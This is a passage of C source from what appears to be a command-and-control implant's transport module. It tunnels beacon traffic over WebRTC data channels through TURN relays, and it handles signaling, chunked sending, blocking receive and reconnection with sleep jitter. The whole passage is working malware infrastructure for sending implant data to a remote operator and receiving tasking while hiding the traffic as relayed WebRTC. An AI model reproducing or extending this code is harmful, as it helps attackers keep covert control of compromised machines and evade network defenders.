        DWORD gatherWait2 = WaitForSingleObject(gGatheringCompleteEvent, 30000);
        if (gatherWait2 != WAIT_OBJECT_0) {
            _err("[TURN] Reconnect ICE gathering timed out");
            goto cleanup_sig;
        }

        /* Get new local description */
        char newLocalSDP[8192] = { 0 };
        int newSdpLen = rtcGetLocalDescription(gPeerConnection, newLocalSDP, sizeof(newLocalSDP));
        if (newSdpLen < 0) {
            _err("[TURN] Failed to get new local description");
            goto cleanup_sig;
        }

        /* Extract new relay info */
        int newRelayPort = 0;
        PCHAR newRelayAddr = TurnExtractRelayAddr(newLocalSDP, &newRelayPort);
        PCHAR newUfrag = TurnExtractICEUfrag(newLocalSDP);
        PCHAR newPwd = TurnExtractICEPwd(newLocalSDP);
        PCHAR newFingerprint = TurnExtractFingerprint(newLocalSDP);

        if (!newRelayAddr || newRelayPort == 0 || !newUfrag || !newPwd || !newFingerprint) {
            _err("[TURN] Missing relay/ICE info in new local SDP");
            if (newRelayAddr) LocalFree(newRelayAddr);
            if (newUfrag) LocalFree(newUfrag);
            if (newPwd) LocalFree(newPwd);
            if (newFingerprint) LocalFree(newFingerprint);
            goto cleanup_sig;
        }

        _dbg("[TURN] Reconnect: sending second POST (relay=%s:%d)", newRelayAddr, newRelayPort);

        /* Send second MinimalAnswer */
        PCHAR sigStatus2 = NULL;
        PCHAR dummy1 = NULL; int dummy2 = 0;
        PCHAR dummy3 = NULL, dummy4 = NULL, dummy5 = NULL;

        BOOL sig2Ok = TurnSendSignalingPost(
            gOfferID, newRelayAddr, newRelayPort, newUfrag, newPwd, newFingerprint,
            &sigStatus2, &dummy1, &dummy2, &dummy3, &dummy4, &dummy5);

        LocalFree(newRelayAddr);
        LocalFree(newUfrag);
        LocalFree(newPwd);
        LocalFree(newFingerprint);

        if (sigStatus2) LocalFree(sigStatus2);
        if (dummy1) LocalFree(dummy1);
        if (dummy3) LocalFree(dummy3);
        if (dummy4) LocalFree(dummy4);
        if (dummy5) LocalFree(dummy5);

        if (!sig2Ok) {
            _err("[TURN] Second signaling POST failed");
            goto cleanup_sig;
        }

        _dbg("[TURN] Reconnect: second POST succeeded");
    }

    /* Free signaling response strings */
    if (sigStatus) LocalFree(sigStatus);
    if (serverRelayAddr) LocalFree(serverRelayAddr);
    if (serverICEUfrag) LocalFree(serverICEUfrag);
    if (serverICEPwd) LocalFree(serverICEPwd);
    if (serverFingerprint) LocalFree(serverFingerprint);

    /* Wait for data channel to open */
    _dbg("[TURN] Waiting for data channel to open...");
    DWORD waitResult = WaitForSingleObject(gDCOpenEvent, TURN_DC_OPEN_TIMEOUT_MS);
    if (waitResult != WAIT_OBJECT_0) {
        _err("[TURN] Timed out waiting for data channel open");
        return FALSE;
    }

    _dbg("[TURN] WebRTC data channel established!");
    return TRUE;

cleanup_sig:
    if (sigStatus) LocalFree(sigStatus);
    if (serverRelayAddr) LocalFree(serverRelayAddr);
    if (serverICEUfrag) LocalFree(serverICEUfrag);
    if (serverICEPwd) LocalFree(serverICEPwd);
    if (serverFingerprint) LocalFree(serverFingerprint);
    return FALSE;
}


/* ------------------------------------------------------------------ */
/*  Chunked Send                                                       */
/* ------------------------------------------------------------------ */
static BOOL TurnSendChunked(PBYTE data, SIZE_T len) {
    if (gDataChannel < 0 || !gDataChannelOpen) {
        _err("[TURN] Data channel not open for send");
        return FALSE;
    }

    /* Build frame: [4-byte BE length][data] */
    SIZE_T frameLen = 4 + len;
    PBYTE frame = (PBYTE)LocalAlloc(LPTR, frameLen);
    if (!frame) return FALSE;

    frame[0] = (BYTE)(len >> 24);
    frame[1] = (BYTE)(len >> 16);
    frame[2] = (BYTE)(len >> 8);
    frame[3] = (BYTE)(len);
    memcpy(frame + 4, data, len);

    /* Send in chunks */
    for (SIZE_T offset = 0; offset < frameLen; offset += TURN_MAX_CHUNK_SIZE) {
        SIZE_T chunkLen = frameLen - offset;
        if (chunkLen > TURN_MAX_CHUNK_SIZE) chunkLen = TURN_MAX_CHUNK_SIZE;

        int ret = rtcSendMessage(gDataChannel, (const char*)(frame + offset), (int)chunkLen);
        if (ret < 0) {
            _err("[TURN] rtcSendMessage failed: %d (offset=%d)", ret, (int)offset);
            LocalFree(frame);
            return FALSE;
        }
    }

    LocalFree(frame);
    return TRUE;
}


/* ------------------------------------------------------------------ */
/*  Blocking Receive                                                   */
/* ------------------------------------------------------------------ */
static BOOL TurnRecvBlocking(PBYTE* ppOutData, SIZE_T* pOutLen, DWORD timeoutMs) {
    *ppOutData = NULL;
    *pOutLen = 0;

    ResetEvent(gRecvEvent);

    /* Check if message already available */
    EnterCriticalSection(&gRecvCS);
    if (gRecvMsg && gRecvMsgLen > 0) {
        *ppOutData = gRecvMsg;
        *pOutLen = gRecvMsgLen;
        gRecvMsg = NULL;
        gRecvMsgLen = 0;
        LeaveCriticalSection(&gRecvCS);
        return TRUE;
    }
    LeaveCriticalSection(&gRecvCS);

    /* Wait for message */
    DWORD result = WaitForSingleObject(gRecvEvent, timeoutMs);
    if (result != WAIT_OBJECT_0) {
        if (gConnectionFailed) {
            _err("[TURN] Connection failed while waiting for recv");
            return FALSE;
        }
        _dbg("[TURN] Recv timeout (%d ms)", timeoutMs);
        return FALSE;
    }

    /* Check for connection failure */
    if (gConnectionFailed) {
        _err("[TURN] Connection failed (recv signaled by failure)");
        return FALSE;
    }

    EnterCriticalSection(&gRecvCS);
    if (gRecvMsg && gRecvMsgLen > 0) {
        *ppOutData = gRecvMsg;
        *pOutLen = gRecvMsgLen;
        gRecvMsg = NULL;
        gRecvMsgLen = 0;
        LeaveCriticalSection(&gRecvCS);
        return TRUE;
    }
    LeaveCriticalSection(&gRecvCS);

    return FALSE;
}


/* ------------------------------------------------------------------ */
/*  TurnReconnect                                                      */
/* ------------------------------------------------------------------ */
BOOL TurnReconnect(void) {
    _dbg("[TURN] Reconnecting...");
    TurnCleanupConnection();

    for (int attempt = 0; attempt < 10; attempt++) {
        if (TurnEstablishWebRTC()) {
            _dbg("[TURN] Reconnected successfully");
            return TRUE;
        }
        _err("[TURN] Reconnect attempt %d failed, retrying...", attempt + 1);
        SleepWithJitter(xenonConfig->sleeptime, xenonConfig->jitter);
    }

    _err("[TURN] All reconnect attempts failed");
    return FALSE;
}


/* ------------------------------------------------------------------ */
/*  NetworkTurnSend - Main entry point from NetworkRequest()           */
/* ------------------------------------------------------------------ */
BOOL NetworkTurnSend(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen) {
    if (!gTurnInitialized) {
        if (!TurnInit()) {
            _err("[TURN] Init failed");
            return FALSE;
        }
    }

    if (WaitForSingleObject(gTurnMutex, INFINITE) != WAIT_OBJECT_0) {
        _err("[TURN] WaitForSingleObject on mutex failed: %d", GetLastError());
        return FALSE;
    }

    /* Lazy-init: establish WebRTC on first call */
    if (gPeerConnection < 0 || !gDataChannelOpen || gConnectionFailed) {
        if (gPeerConnection >= 0) {
            TurnCleanupConnection();
        }
        if (!TurnEstablishWebRTC()) {
            _err("[TURN] Failed to establish WebRTC");
            ReleaseMutex(gTurnMutex);
            return FALSE;
        }
    }

    /* Send the package data */
    _dbg("[TURN] Sending %d bytes", (int)package->length);
    BOOL sendOk = TurnSendChunked((PBYTE)package->buffer, package->length);
    if (!sendOk) {
        _err("[TURN] Send failed, attempting reconnect");
        if (TurnReconnect()) {
            sendOk = TurnSendChunked((PBYTE)package->buffer, package->length);
        }
        if (!sendOk) {
            _err("[TURN] Send failed after reconnect");
            ReleaseMutex(gTurnMutex);
            return FALSE;
        }
    }

    /* Receive response */
    PBYTE recvData = NULL;
    SIZE_T recvLen = 0;
    BOOL recvOk = TurnRecvBlocking(&recvData, &recvLen, TURN_RECV_TIMEOUT_MS);
    if (!recvOk || !recvData) {
        if (gConnectionFailed) {
            _err("[TURN] Connection lost during recv, attempting reconnect");
            if (TurnReconnect()) {
                /* Resend after reconnect */
                sendOk = TurnSendChunked((PBYTE)package->buffer, package->length);
                if (sendOk) {
                    recvOk = TurnRecvBlocking(&recvData, &recvLen, TURN_RECV_TIMEOUT_MS);
                }
            }
        }
        if (!recvOk || !recvData) {
            _err("[TURN] Recv failed");
            ReleaseMutex(gTurnMutex);
            return FALSE;
        }
    }

    _dbg("[TURN] Received %d bytes", (int)recvLen);

    *ppOutData = recvData;
    *pOutLen = recvLen;

    ReleaseMutex(gTurnMutex);
    return TRUE;
}


#endif /* TURNC2_TRANSPORT */
